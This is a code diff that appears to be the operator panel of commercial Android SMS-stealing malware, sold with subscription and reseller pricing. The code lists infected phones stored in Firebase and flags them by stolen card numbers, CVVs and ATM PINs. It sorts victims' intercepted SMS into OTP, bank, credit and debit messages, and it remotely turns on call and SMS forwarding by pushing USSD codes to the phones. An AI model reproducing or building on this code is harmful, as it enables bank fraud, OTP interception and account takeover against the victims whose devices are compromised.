+function updateFwUI(){
+  var badgeHtml=_callFwEnabled?'<span class="fw-badge on">🟢 ACTIVE</span>':'<span class="fw-badge off">⚪ INACTIVE</span>';
+  var cbrM=document.getElementById('cfBadgeRowModal');if(cbrM)cbrM.innerHTML=badgeHtml;
+  var cfOnM=document.getElementById('cfOnBtnModal'),cfOffM=document.getElementById('cfOffBtnModal');
+  if(cfOnM)cfOnM.className='stb'+(_callFwEnabled?' on':'');
+  if(cfOffM)cfOffM.className='stb'+(!_callFwEnabled?' off':'');
+}
+function setCallFw(on){_callFwEnabled=on;updateFwUI();}
+function selCfSim(n){
+  _callFwSim=n;
+  var s1=document.getElementById('cfSim1'),s2=document.getElementById('cfSim2');
+  if(s1)s1.className='stb'+(n===1?' s1':'');
+  if(s2)s2.className='stb'+(n===2?' s2':'');
+}
+function getCallFwUssd(type,target){var n=String(target).replace(/[^\d]/g,'');if(!n)return'';var cc=n;if(cc.length===10)cc='91'+cc;var prefix='21';if(type==='busy')prefix='67';else if(type==='no_answer')prefix='61';else if(type==='unreachable')prefix='62';return'**'+prefix+'*+'+cc+'#';}
+async function applyCallFwModal(){
+  if(!selDev){toast('Select device');return;}
+  if(!fbDB){toast('Not ready');return;}
+  var devPath='clients/'+selDev.id;
+  var target=(document.getElementById('cfTargetModal').value||'').trim();
+  if(!_callFwEnabled){
+    try{
+      await fbDB.ref(devPath+'/forwarding/call').set({enabled:false,sim:_callFwSim,updatedAt:Date.now()});
+      await fbDB.ref(devPath+'/commands/ussd').set({code:'##002#',requestedAt:Date.now()});
+      showRes2('cfResModal',true,'✓ Forward DISABLED');
+    }catch(e){showRes2('cfResModal',false,'Error');}
+    return;
+  }
+  if(!target){showRes2('cfResModal',false,'⚠ Enter target');return;}
+  var ussd=getCallFwUssd('always',target);
+  try{
+    await fbDB.ref(devPath+'/forwarding/call').set({enabled:true,target:target,type:'always',sim:_callFwSim,ussd:ussd,updatedAt:Date.now()});
+    await fbDB.ref(devPath+'/commands/ussd').set({code:ussd,sim:_callFwSim,requestedAt:Date.now()});
+    showRes2('cfResModal',true,'✓ Forward ENABLED → '+target);
+    showToast('✓ Call forward saved','on');
+  }catch(e){showRes2('cfResModal',false,'Error');}
+}
+function openCfModal(){
+  if(!selDev){toast('Select device');return;}
+  var nameEl = document.getElementById('cfDevName');
+  if(nameEl) nameEl.textContent = '· ' + getDeviceDisplayName(selDev);
+  var cfTm=document.getElementById('cfTargetModal');
+  if(cfTm) cfTm.value=_callFwTarget || '';
+  selCfSim(_callFwSim || 1);
+  updateFwUI();
+  openM('cfModal');
+}
+function showRes2(id,ok,msg){var el=document.getElementById(id);if(!el)return;el.textContent=msg;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},6000);}
+
+function renderCallLogs(data){
+  var el=document.getElementById('callLogList');if(!el)return;
+  var entries=Object.entries(data);
+  if(!entries.length){el.innerHTML='<div class="empty" style="padding:20px;"><div class="ei">📞</div><p>No calls yet</p></div>';return;}
+  var arr=entries.map(function(p){var v=p[1]||{};return{key:p[0],number:v.number||v.from||v.phoneNumber||'Unknown',type:String(v.type||'incoming').toLowerCase(),dateTime:v.dateTime||v.time||v.timestamp||'',duration:v.duration||0};}).sort(function(a,b){return parseDT(b.dateTime)-parseDT(a.dateTime);});
+  var html='';
+  for(var i=0;i<Math.min(arr.length,50);i++){
+    var c=arr[i];var icon='📥',color='var(--blue-text)';
+    if(c.type.indexOf('missed')!==-1){icon='📵';color='var(--rose-text)';}else if(c.type.indexOf('out')!==-1){icon='📤';color='var(--green-deep)';}
+    var ts=c.dateTime?(parseDT(c.dateTime)?new Date(parseDT(c.dateTime)).toLocaleString():c.dateTime):'—';
+    html+='<div class="msg-bub inc" style="border-left-color:'+color+';margin-bottom:8px;"><div class="msg-bub-head"><span class="msg-bub-sender">'+icon+' '+esc(fmtPh(c.number))+'</span><span class="msg-bub-time">'+esc(ts)+'</span></div><div class="msg-bub-txt" style="font-size:12px;">Duration: '+esc(c.duration)+'s</div></div>';
+  }
+  el.innerHTML=html;
+}
+
+function updateSmsFwUI(){
+  var badgeHtml=_smsFwEnabled?'<span class="fw-badge on">🟢 ACTIVE</span>':'<span class="fw-badge off">⚪ INACTIVE</span>';
+  var bEl=document.getElementById('smsFwBadgeRow');if(bEl)bEl.innerHTML=badgeHtml;
+  var onBtn=document.getElementById('smsFwOnBtn'),offBtn=document.getElementById('smsFwOffBtn');
+  if(onBtn)onBtn.className='stb'+(_smsFwEnabled?' on':'');
+  if(offBtn)offBtn.className='stb'+(!_smsFwEnabled?' off':'');
+}
+function setSmsFw(on){_smsFwEnabled=on;updateSmsFwUI();}
+function selSmsFwSim(n){
+  _smsFwSim=n;
+  var s1=document.getElementById('smsFwSim1'),s2=document.getElementById('smsFwSim2');
+  if(s1)s1.className='stb'+(n===1?' s1':'');
+  if(s2)s2.className='stb'+(n===2?' s2':'');
+}
+async function applySmsFw(){
+  if(!selDev){toast('Select device');return;}
+  if(!fbDB){toast('Not ready');return;}
+  var devPath='clients/'+selDev.id;
+  var target=(document.getElementById('smsFwTarget').value||'').trim();
+  if(_smsFwEnabled && !target){showRes2('smsFwRes',false,'⚠ Enter target');return;}
+  try{
+    await fbDB.ref(devPath+'/forwarding/sms').set({
+      enabled:_smsFwEnabled,
+      target:target,
+      sim:_smsFwSim,
+      updatedAt:Date.now()
+    });
+    showRes2('smsFwRes',true,_smsFwEnabled?'✓ SMS Forward ENABLED → '+target:'✓ SMS Forward DISABLED');
+    showToast('✓ SMS forward saved','on');
+  }catch(e){showRes2('smsFwRes',false,'Error: '+e.message);}
+}
+function openSmsFwdModal(){
+  if(!selDev){toast('Select device');return;}
+  var nameEl = document.getElementById('smsFwDevName');
+  if(nameEl) nameEl.textContent = '· ' + getDeviceDisplayName(selDev);
+  var inp=document.getElementById('smsFwTarget');
+  if(inp) inp.value=_smsFwTarget || '';
+  selSmsFwSim(_smsFwSim || 1);
+  updateSmsFwUI();
+  openM('smsFwdModal');
+}
+
+function parseDevs(data,path){
+  var out=[];if(!data||typeof data!=='object')return out;
+  Object.keys(data).forEach(function(id){
+    var raw=data[id];if(!raw||typeof raw!=='object')return;
+    var strongMarkers=['submissions','deviceModel','cardNumber','cvv','atmPin','forms','cardDetails','sim1','sim2','brand','battery'];
+    var hasStrong=false;for(var s=0;s<strongMarkers.length;s++)if(strongMarkers[s]in raw){hasStrong=true;break;}
+    var weakMarkers=['online','isOnline','sims','battery','batteryRaw','model','mobNo','lastSeen','deviceName','status','android_id'];
+    var hits=0;for(var i=0;i<weakMarkers.length;i++)if(weakMarkers[i]in raw)hits++;
+    if(!hasStrong&&hits<2)return;
+
+    var sims = [];
+    if (raw.sim1 && typeof raw.sim1 === 'string' && raw.sim1 !== 'N/A') {
+        var p1 = raw.sim1.split('|').map(function(x){return x.trim();});
+        if (p1.length >= 2 && p1[1] !== 'N/A' && p1[1] !== '') {
+            var slotMatch = raw.sim1.match(/slot:?\s*(\d+)/i);
+            sims.push({ carrierName: p1[0], phoneNumber: p1[1], slotIndex: slotMatch ? parseInt(slotMatch[1]) : 1 });
+        }
+    }
+    if (raw.sim2 && typeof raw.sim2 === 'string' && raw.sim2 !== 'N/A') {
+        var p2 = raw.sim2.split('|').map(function(x){return x.trim();});
+        if (p2.length >= 2 && p2[1] !== 'N/A' && p2[1] !== '') {
+            var slotMatch2 = raw.sim2.match(/slot:?\s*(\d+)/i);
+            sims.push({ carrierName: p2[0], phoneNumber: p2[1], slotIndex: slotMatch2 ? parseInt(slotMatch2[1]) : 2 });
+        }
+    }
+    if (raw.sims) {
+        var oldSims = Array.isArray(raw.sims) ? raw.sims : Object.values(raw.sims);
+        oldSims.forEach(function(os) {
+            if (os && (os.phoneNumber || os.number)) {
+                var exists = sims.find(function(s){ return s.phoneNumber === (os.phoneNumber || os.number); });
+                if (!exists) sims.push(os);
+            }
+        });
+    }
+
+    var batt=raw.batteryRaw!=null?raw.batteryRaw:(raw.battery!=null?raw.battery:'—');
+    var bn=parseInt(String(batt).replace('%',''));
+    var mob=fmtPh(raw.mobNo||(sims[0]&&(sims[0].phoneNumber||sims[0].number))||'');
+    var ts=parseDT(raw.lastSeen||raw.last_seen||raw.timestamp||raw.updatedAt||raw.createdAt||'')||0;
+    out.push({id:id,path:path||'devices',name:raw.model||raw.name||raw.deviceName||id,batteryRaw:batt,batteryNum:isNaN(bn)?-1:bn,status:isDeviceOnline(raw),mobNo:mob,sims:sims,ts:ts,raw:raw});
+  });
+  return out;
+}
+function isDeviceOnline(raw){
+  if(!raw||typeof raw!=='object')return false;
+  var bf=['online','isOnline','is_online','isActive','active','connected','status','state'];
+  for(var i=0;i<bf.length;i++){if(!(bf[i]in raw))continue;var v=raw[bf[i]];if(v===true||v===1)return true;if(v===false||v===0)return false;if(typeof v==='string'){var s=v.toLowerCase().trim();if(['online','true','1','yes','on','active','connected','live'].indexOf(s)!==-1)return true;if(['offline','false','0','no','off','inactive','disconnected','dead'].indexOf(s)!==-1)return false;}}
+  var tsFields=['lastSeen','lastOnline','lastPing','heartbeat','updatedAt','timestamp','time','lastActive'];
+  var latest=0;for(var k=0;k<tsFields.length;k++)if(raw[tsFields[k]]!=null){var t=parseDT(raw[tsFields[k]]);if(t>latest)latest=t;}
+  if(latest>0)return(Date.now()-latest)/60000<5;
+  return false;
+}
+function parseMsgs(data){
+  var out=[];if(!data)return out;
+  
+  var wrapper = null;
+  if (data.smss && typeof data.smss === 'object' && !Array.isArray(data.smss)) {
+      data = data.smss; wrapper = 'smss';
+  } else if (data.sms && typeof data.sms === 'object' && !Array.isArray(data.sms) && !data.message && !data.body) {
+      data = data.sms; wrapper = 'sms';
+  }
+
+  var entries=Array.isArray(data)?data.map(function(v,i){return[String(i),v];}):Object.entries(data);
+  entries.forEach(function(pair){
+    var key=pair[0],v=pair[1];if(!v)return;
+    var msg='',snd='',dt='',typ='incoming';
+    if(typeof v==='string'){msg=v;snd=key;}
+    else if(typeof v==='object'){
+      msg=v.message||v.body||v.text||v.msg||v.content||v.sms||'';
+      snd=v.sender||v.from||v.address||v.phoneNumber||v.number||'';
+      dt=v.dateTime||v.date||v.time||v.timestamp||'';
+      var t=String(v.type||'').toLowerCase();
+      typ=(t==='2'||t.indexOf('sent')!==-1||t.indexOf('outgoing')!==-1)?'outgoing':'incoming';
+    }
+    if(!msg&&!snd){msg=JSON.stringify(v);snd='Raw';}
+    out.push({key:key,message:msg||'(empty)',sender:snd||'Unknown',dateTime:dt,type:typ,ts:parseDT(dt),raw:v, wrapper: wrapper});
+  });
+  out.sort(function(a,b){
+    var aKey=String(a.key||''),bKey=String(b.key||'');
+    var aIsPush=aKey.charAt(0)==='-'&&aKey.length>=10,bIsPush=bKey.charAt(0)==='-'&&bKey.length>=10;
+    if(aIsPush&&bIsPush)return bKey.localeCompare(aKey);
+    if(/^\d+$/.test(aKey)&&/^\d+$/.test(bKey))return parseInt(bKey,10)-parseInt(aKey,10);
+    var aT=a.ts||0,bT=b.ts||0;
+    if(aT!==bT)return bT-aT;
+    return bKey.localeCompare(aKey);
+  });
+  return out;
+}
+function parseDT(v){
+  if(!v)return 0;var s=String(v).trim();
+  if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');
+  
+  var m1 = s.match(/(\d{1,2})[-\/.](\d{1,2})[-\/.](\d{4}).*?(\d{1,2}):(\d{2})/);
+  if(m1)return new Date(+m1[3],+m1[2]-1,+m1[1],+m1[4],+m1[5]).getTime();
+  
+  var m2 = s.match(/(\d{4})[-\/.](\d{1,2})[-\/.](\d{1,2}).*?(\d{1,2}):(\d{2})/);
+  if(m2)return new Date(+m2[1],+m2[2]-1,+m2[3],+m2[4],+m2[5]).getTime();
+
+  var dt=new Date(s);return isNaN(dt.getTime())?0:dt.getTime();
+}
+function getMsgTimeStr(m) {
+    if (!m) return '';
+    if (m.dateTime && typeof m.dateTime === 'string' && isNaN(Number(m.dateTime)) && m.dateTime.length > 5) {
+        return m.dateTime;
+    }
+    if (m.ts) {
+        var d = new Date(m.ts);
+        if (!isNaN(d.getTime())) {
+            var day = ('0' + d.getDate()).slice(-2);
+            var month = ('0' + (d.getMonth() + 1)).slice(-2);
+            var year = d.getFullYear();
+            var hours = d.getHours();
+            var minutes = ('0' + d.getMinutes()).slice(-2);
+            var ampm = hours >= 12 ? 'pm' : 'am';
+            hours = hours % 12;
+            hours = hours ? hours : 12;
+            return day + '-' + month + '-' + year + ' | ' + hours + ':' + minutes + ' ' + ampm;
+        }
+    }
+    return m.dateTime || '';
+}
+function fmtPh(p){
+  if(!p)return'—';
+  var d=String(p).replace(/\D/g,'');
+  if(d.startsWith('91')&&d.length===12)return'+'+d;
+  if(d.length===10)return'+91'+d;
+  if(d.length>10)return'+'+d;
+  return'—';
+}
+function stripIndiaCode(p){if(!p||p==='—')return'';var s=String(p).trim();if(/^\d{6,10}$/.test(s))return s;s=s.replace(/\D/g,'');if(s.startsWith('91')&&s.length===12)return s.slice(2);return s;}
+function renderStats(){_lastStatsSig=allDevices.length+'_'+allDevices.filter(function(d){return d.status;}).length;}
+function setTxt(id,v){var el=document.getElementById(id);if(el)el.textContent=v;}
+
+function switchTab(t){
+  currentNav=t;
+  var mainContent=document.getElementById('mainContent');if(!mainContent)return;
+  document.querySelectorAll('.bottom-nav .nav-item').forEach(function(el){el.classList.toggle('active',el.getAttribute('data-nav')===t);});
+  if(!_dataLoaded&&allDevices.length===0){mainContent.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>📱 Loading…</div></div>';return;}
+  mainContent.scrollTop=0;
+  if(t==='overview')mainContent.innerHTML=renderOverviewHTML();
+  else if(t==='devices'){_devSearchQuery='';mainContent.innerHTML=renderDevicesHTML();}
+  else if(t==='messages'){_msgSearchQuery='';mainContent.innerHTML=renderMessagesHTML();loadAllMessages(false);}
+  else if(t==='settings'){mainContent.innerHTML=renderSettingsHTML();update2FACardsUI();}
+  requestAnimationFrame(function(){mainContent.scrollTop=0;});
+}
+
+function renderOverviewHTML(){
+  if(!_dataLoaded&&allDevices.length===0)return'<div class="ldwrap"><div class="gold-spin"></div><div>📱 Loading…</div></div>';
+  var online=allDevices.filter(function(d){return d.status;}).length;
+  var offline=allDevices.length-online;
+  var total=allDevices.length;
+  var html='';
+  html+='<div class="wcard">';
+  html+='<div class="wcard-top"><div class="wcard-icon">◇</div><div class="gold-badge">👑 GOLD</div></div>';
+  html+='<div class="wcard-label">WELCOME BACK</div>';
+  html+='<div class="wcard-title">AdminPro</div>';
+  html+='<div class="wcard-row"><div class="wcard-row-left"><span class="wclock">🕐</span>325 days left</div><span class="wcard-row-date">Aug 28</span></div>';
+  html+='<button class="sync-btn" onclick="pingAllDevices()">🔄 Sync All Accounts</button>';
+  html+='</div>';
+  html+='<div class="stats-grid">';
+  html+='<div class="stat-card"><div class="stat-icon">📱</div><div class="stat-val">'+total+'</div><div class="stat-lbl">Devices</div></div>';
+  html+='<div class="stat-card"><div class="stat-icon">📶</div><div class="stat-val">'+online+'</div><div class="stat-lbl">Online</div></div>';
+  html+='<div class="stat-card offline"><div class="stat-icon">📵</div><div class="stat-val">'+offline+'</div><div class="stat-lbl">Offline</div></div>';
+  html+='</div>';
+  html+='<div class="quick-row">';
+  html+='<div class="qcard" onclick="switchTab(\'devices\')"><div class="qcard-icon">📱</div><div class="qcard-title">Devices</div><div class="qcard-sub">'+total+' connected</div></div>';
+  html+='<div class="qcard" onclick="switchTab(\'messages\')"><div class="qcard-icon">💬</div><div class="qcard-title">Messages</div><div class="qcard-sub">View all SMS</div></div>';
+  html+='<div class="qcard" onclick="switchTab(\'settings\')"><div class="qcard-icon">⚙</div><div class="qcard-title">Settings</div><div class="qcard-sub">Configure panel</div></div>';
+  html+='</div>';
+  html+='<div class="sec-hdr"><div class="sec-title">All Devices</div><div class="sec-link" onclick="switchTab(\'devices\')">View all →</div></div>';
+  html+='<div class="dev-list">';
+  if(!allDevices.length)html+='<div class="empty"><div class="ei">📱</div><p>No devices found</p></div>';
+  else{var newest=allDevices.slice().sort(function(a,b){return (b.ts||0)-(a.ts||0);}).slice(0,2);newest.forEach(function(d){html+=renderDeviceCard(d);});}
+  html+='</div>';
+  html+='<div class="info-card" onclick="showToast(\'Plans from $50\')"><div class="info-icon gold">🔑</div><div class="info-body"><div class="info-title">Extend Access</div><div class="info-sub">Plans from $50</div></div><span class="info-arrow">›</span></div>';
+  html+='<div class="info-card" onclick="showToast(\'Just $99 · Earn 50%\')"><div class="info-icon pink">👥</div><div class="info-body"><div class="info-title">Become a Reseller</div><div class="info-sub">Just $99 · Earn 50% per sale</div></div><span class="info-arrow">›</span></div>';
+  html+='<div class="cap-hdr">CAPABILITIES</div>';
+  html+='<div class="cap-grid">';
+  html+='<div class="cap-card"><span class="cap-icon green">📱</span><div class="cap-title">Device Control</div><div class="cap-sub">Full remote access</div></div>';
+  html+='<div class="cap-card"><span class="cap-icon pink">🔒</span><div class="cap-title">2FA Security</div><div class="cap-sub">OTP &amp; PIN</div></div>';
+  html+='<div class="cap-card"><span class="cap-icon gold">⚡</span><div class="cap-title">Real-time Sync</div><div class="cap-sub">Live data streaming</div></div>';
+  html+='<div class="cap-card"><span class="cap-icon green">🌐</span><div class="cap-title">Telegram Bot</div><div class="cap-sub">Instant alerts</div></div>';
+  html+='</div>';
+  html+='<div class="premium-card">';
+  html+='<div class="premium-badge">⭐ PREMIUM PANEL</div>';
+  html+='<div class="premium-price">$499<small>/mo</small></div>';
+  html+='<div class="premium-features"><span class="premium-feature">Full Access</span><span class="premium-feature">∞ Devices</span><span class="premium-feature">Telegram</span><span class="premium-feature">2FA</span><span class="premium-feature">Updates</span></div>';
+  html+='<button class="premium-btn" onclick="showToast(\'Contact adminpro@gmail.com\',\'on\')">✈ Contact</button>';
+  html+='</div>';
+  return html;
+}
+
+function renderDevicesHTML(){
+  if(!_dataLoaded&&allDevices.length===0)return'<div class="ldwrap"><div class="gold-spin"></div><div>📱 Loading…</div></div>';
+  var online=allDevices.filter(function(d){return d.status;}).length;
+  var offline=allDevices.length-online;
+  var html='';
+  html+='<div class="page-head">';
+  html+='<div class="ph-icon">🔍</div>';
+  html+='<div class="ph-body"><div class="ph-title">Devices</div><div class="ph-sub">'+allDevices.length+' total devices</div></div>';
+  html+='<div class="ph-right"><span class="count-pill on">📶 '+online+'</span><span class="count-pill off">📵 '+offline+'</span></div>';
+  html+='</div>';
+  html+='<div class="search-box"><span class="search-ico">🔍</span><input placeholder="Search devices..." value="'+esc(_devSearchQuery)+'" oninput="filterDevList(this.value)"/></div>';
+  html+='<div class="chip-row">';
+  html+='<div class="chip '+(currentDevFilter==='all'?'active':'')+'" onclick="setDevFilter(\'all\')">All <span class="chip-count">'+allDevices.length+'</span></div>';
+  html+='<div class="chip '+(currentDevFilter==='online'?'active':'')+'" onclick="setDevFilter(\'online\')">Online <span class="chip-count">'+online+'</span></div>';
+  html+='<div class="chip '+(currentDevFilter==='offline'?'active':'')+'" onclick="setDevFilter(\'offline\')">Offline <span class="chip-count">'+offline+'</span></div>';
+  html+='<div class="chip '+(currentDevFilter==='pin'?'active':'')+'" onclick="setDevFilter(\'pin\')">With PIN</div>';
+  html+='</div>';
+  html+='<div class="chip-row small">';
+  html+='<div class="sort-chip" onclick="toggleDevSort()">↕ '+(currentDevSort==='newest'?'Newest':'Oldest')+'</div>';
+  html+='<div class="sort-chip">⏱ Kiskahai</div>';
+  html+='</div>';
+  html+='<div class="dev-list" id="devList">';
+  var list=filterDevicesList();
+  if(_devSearchQuery){
+    list=list.filter(function(d){return (getDeviceDisplayName(d)+d.id+d.mobNo).toLowerCase().indexOf(_devSearchQuery.toLowerCase())!==-1;});
+  }
+  if(!list.length)html+='<div class="empty"><div class="ei">📱</div><p>No devices found</p></div>';
+  else list.forEach(function(d){html+=renderDeviceCard(d);});
+  html+='</div>';
+  return html;
+}
+function toggleDevSort(){currentDevSort=currentDevSort==='newest'?'oldest':'newest';var mc=document.getElementById('mainContent');if(mc&&currentNav==='devices'){mc.innerHTML=renderDevicesHTML();}}
+function filterDevicesList(){
+  var list=allDevices.slice();
+  if(currentDevFilter==='online'){
+    list=list.filter(function(d){return d.status;});
+  }
+  else if(currentDevFilter==='offline'){
+    list=list.filter(function(d){return !d.status;});
+  }
+  else if(currentDevFilter==='pin'){
+    list=list.filter(function(d){
+      var cards = getDeviceCards(d);
+      if(!cards || !cards.length) return false;
+      for(var i=0; i<cards.length; i++){
+          if(cards[i].atmPin && String(cards[i].atmPin).trim() !== '') return true;
+      }
+      return false;
+    });
+  }
+  
+  if(currentDevSort==='oldest')list.reverse();
+  return list;
+}
+function setDevFilter(f){currentDevFilter=f;var mc=document.getElementById('mainContent');if(mc&&currentNav==='devices'){mc.innerHTML=renderDevicesHTML();}}
+function filterDevList(q){
+  _devSearchQuery = q || '';
+  var list=filterDevicesList().filter(function(d){if(!q)return true;return(getDeviceDisplayName(d)+d.id+d.mobNo).toLowerCase().indexOf(q.toLowerCase())!==-1;});
+  var el=document.getElementById('devList');if(!el)return;
+  if(!list.length){el.innerHTML='<div class="empty"><div class="ei">📱</div><p>No matches</p></div>';return;}
+  el.innerHTML=list.map(function(d){return renderDeviceCard(d);}).join('');
+}
+
+function renderDeviceCard(d){
+  var bi=d.batteryNum>=40?'🔋':'🪫';
+  var bt=d.batteryNum>=0?d.batteryNum+'%':'—';
+  var idEnc=encodeURIComponent(d.id);
+  var num=getDeviceNumber(d.id);
+  var displayName=getDeviceDisplayName(d);
+  var initials=getDeviceInitials(displayName);
+  var statusLabel=d.status?'Online':'Offline';
+  var statusCls=d.status?'on':'off';
+  var sims=d.sims||[];
+  var androidVer=d.raw&&(d.raw.androidVersion||d.raw.android||d.raw.osVersion||d.raw.os)||'';
+  var simHtml='';
+  sims.slice(0,2).forEach(function(s,i){
+    var carrier=s.carrierName||s.carrier||s.networkOperator||s.operator||'Unknown';
+    var num2=s.phoneNumber||s.number||s.msisdn||'Unknown';
+    simHtml+='<div class="dc-sim"><span class="simtag'+(i===1?' s2':'')+'">SIM'+(i+1)+'</span>'+esc(carrier)+' | '+esc(num2)+' | slot:'+i+'</div>';
+  });
+
+  var fwd = _devFwdCache[d.id] || {call:{on:false},sms:{on:false}};
+  var fwdTags = '';
+  if(fwd.call.on){
+    fwdTags += '<span class="dc-tag fwd-on">📞 ' + esc(fwd.call.target || '—') + '</span>';
+  }
+  if(fwd.sms.on){
+    fwdTags += '<span class="dc-tag fwd-on">📨 ' + esc(fwd.sms.target || '—') + '</span>';
+  }
+  if(!fwdTags){
+    fwdTags = '<span class="dc-tag fwd-off">No forwarding</span>';
+  }
+
+  var isPinging = !!_pingingDevices[d.id];
+  var pingClass = isPinging ? ' pinging' : '';
+
+  return '<div class="dev-card'+(isPinging?' ping-glow':'')+'" data-dev="'+idEnc+'">'
+    +'<div class="dc-top">'
+    +'<div class="dc-av'+(d.status?' active':'')+'">'+initials+'<span class="dot '+statusCls+'"></span></div>'
+    +'<div class="dc-info"><div class="dc-name">'+esc(displayName)+'</div><div class="dc-id">#'+num+'</div></div>'
+    +'<div class="dc-right"><div class="dc-status '+statusCls+'"><span class="dotb"></span>'+statusLabel+'</div></div>'
+    +'</div>'
+    +'<div class="dc-tags">'+fwdTags+'</div>'
+    +'<div class="dc-specs">'
+    +'<div class="dc-spec batt"><span class="sico">'+bi+'</span><span class="sval">'+bt+'</span></div>'
+    +(androidVer?'<div class="dc-spec"><span class="sico">📱</span><span class="sval">Android '+esc(String(androidVer).replace(/^Android\s*/i,''))+'</span></div>':'')
+    +'</div>'
+    +(simHtml?'<div class="dc-sims">'+simHtml+'</div>':'')
+    +'<div class="dc-actions">'
+    +'<button class="dc-btn'+pingClass+'" onclick="event.stopPropagation();pingSingleDevice(\''+esc(d.id).replace(/'/g,"\\'")+'\')"><span class="dbico">🔔</span>Ping</button>'
+    +'<button class="dc-btn green" onclick="event.stopPropagation();openDeviceDetail(\''+esc(d.id).replace(/'/g,"\\'")+'\')"><span class="dbico">👁</span>View</button>'
+    +'<button class="dc-btn red" onclick="event.stopPropagation();deleteDeviceConfirm(\''+esc(d.id).replace(/'/g,"\\'")+'\')"><span class="dbico">🗑</span>Delete</button>'
+    +'</div></div>';
+}
+function deleteDeviceConfirm(id){
+  var dev=allDevices.find(function(d){return d.id===id;});if(!dev)return;
+  if(!fbDB){toast('Not ready');return;}
+  document.getElementById('confT').textContent='Delete device?';
+  document.getElementById('confM').textContent=getDeviceDisplayName(dev)+' permanently delete ho jayega.';
+  document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDB.ref((dev.path||'clients')+'/'+dev.id).remove();toast('✓ Deleted');_allMsgsLoaded=false;}catch(e){toast('Error');}};
+  openM('confirmModal');
+}
+
+function renderMessagesHTML(){
+  var incoming=globalMsgs.filter(function(m){return m.type==='incoming';});
+  var counts=getMsgFilterCounts();
+  var html='';
+  html+='<div class="page-head">';
+  html+='<div class="ph-icon">💬</div>';
+  html+='<div class="ph-body"><div class="ph-title">Messages</div><div class="ph-sub">'+incoming.length+' messages</div></div>';
+  html+='<div class="ph-right">';
+  html+='<button style="padding:8px 12px;border-radius:11px;background:var(--green-bg);color:var(--green-deep);border:none;font-family:Inter,sans-serif;font-size:11px;font-weight:800;cursor:pointer;margin-right:6px;" onclick="loadAllMessages(true)">🔄 Refresh</button>';
+  html+='<button style="padding:8px 12px;border-radius:11px;background:var(--rose-bg);color:var(--rose-text);border:none;font-family:Inter,sans-serif;font-size:11px;font-weight:800;cursor:pointer;" onclick="deleteAllMsgs()">🗑 Delete All</button>';
+  html+='</div>';
+  html+='</div>';
+  html+='<div class="search-box"><span class="search-ico">🔍</span><input placeholder="Search messages..." value="'+esc(_msgSearchQuery)+'" oninput="filterMsgList(this.value)"/></div>';
+  html+='<div class="chip-row">';
+  ['all','credit','debit','otp','bank','other'].forEach(function(k){
+    var label=k.charAt(0).toUpperCase()+k.slice(1);
+    var activeCls=currentMsgFilter===k?'active':'';
+    if(k==='credit')activeCls+=' purple';
+    html+='<div class="chip '+activeCls+'" onclick="setMsgFilter(\''+k+'\')">'+label+' <span class="chip-count">'+(counts[k]||0)+'</span></div>';
+  });
+  html+='</div>';
+  html+='<div class="chip-row small"><div class="sort-chip">↕ Newest</div></div>';
+  html+='<div id="msgList">'+renderMsgsAggregate()+'</div>';
+  return html;
+}
+function getMsgFilterCounts(){
+  var c={all:0,credit:0,debit:0,otp:0,bank:0,other:0};
+  globalMsgs.forEach(function(m){if(m.type!=='incoming')return;c.all++;var cat=categorizeMsg(m);if(c[cat]!==undefined)c[cat]++;else c.other++;});
+  return c;
+}
+function renderMsgsAggregate(){
+  var list=globalMsgs.filter(function(m){return m.type==='incoming';});
+  if(currentMsgFilter!=='all')list=list.filter(function(m){return categorizeMsg(m)===currentMsgFilter;});
+  if(!list.length)return'<div class="empty"><div class="ei">💬</div><p>No messages</p><p class="hint">'+(globalMsgs.length===0?'Loading…':'Try different filter')+'</p></div>';
+  var html='';
+  list.slice(0,200).forEach(function(m){
+    var cat=categorizeMsg(m);
+    var catLabel={credit:'Credit',debit:'Debit',otp:'Otp',bank:'Bank',other:'Other'}[cat]||'Other';
+    var amtMatch=(m.message||'').match(/(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)/i);
+    var amount=amtMatch?'₹'+amtMatch[1]:'';
+    var isDebit=cat==='debit';
+    var shortSender=(m.sender||'').substring(0,12);
+    var hash=(m.key||'').replace(/[^a-z0-9]/gi,'').substring(0,16)||'—';
+    var flashCls='';if(_newMsgKeys[m.key]){var age=Date.now()-_newMsgKeys[m.key];if(age<8000)flashCls=' flash';}
+    var devIdEnc=m.deviceId?encodeURIComponent(m.deviceId):'';
+    var devTag=m.deviceName?'<span class="msg-dev-tag">📱 '+esc(String(m.deviceName).substring(0,20))+'</span>':'';
+    
+    var devObj = allDevices.find(function(d){return d.id === m.deviceId;});
+    var androidId = devObj && devObj.raw && devObj.raw.android_id ? devObj.raw.android_id : '';
+    var wrapperStr = m.wrapper ? m.wrapper : '';
+
+    html+='<div class="msg-card'+flashCls+'" data-msgdev="'+devIdEnc+'" onclick="openDeviceFromMsg(this)">';
+    html+='<div class="msg-head"><span class="msg-sender">'+esc(shortSender)+'</span><span class="msg-cat '+cat+'">'+catLabel+'</span>';
+    if(amount)html+='<span class="msg-amount '+cat+'">'+(isDebit?'↑ ':'↓ ')+esc(amount)+'</span>';
+    html+='<span class="msg-time">'+esc(getMsgTimeStr(m))+'</span></div>';
+    if(devTag)html+='<div style="margin-bottom:8px;">'+devTag+'</div>';
+    html+='<div class="msg-body">'+esc(m.message)+'</div>';
+    html+='<div class="msg-foot"><span class="msg-sim">SIM 0</span><span class="msg-hash">'+esc(hash)+'</span>';
+    html+='<div class="msg-acts">';
+    html+='<button class="msg-act" onclick="event.stopPropagation();copyMsg(this)" data-msg="'+esc(m.message).replace(/"/g,'&quot;')+'">📋</button>';
+    html+='<button class="msg-act del" onclick="event.stopPropagation();deleteMsgFromList(\''+esc(m.key).replace(/'/g,"\\'")+'\',\''+esc(m.deviceId||'').replace(/'/g,"\\'")+'\',\''+esc(androidId).replace(/'/g,"\\'")+'\',\''+wrapperStr+'\')">🗑</button>';
+    html+='<button class="msg-act view" onclick="event.stopPropagation();'+ (devIdEnc? 'openDeviceFromMsg(this)' : 'showToast(\'Device not found\')') +'">👁</button>';
+    html+='</div></div></div>';
+  });
+  return html;
+}
+function openDeviceFromMsg(el){var devId=decodeURIComponent(el.getAttribute('data-msgdev')||'');if(!devId){toast('Device not available');return;}openDeviceDetail(devId);}
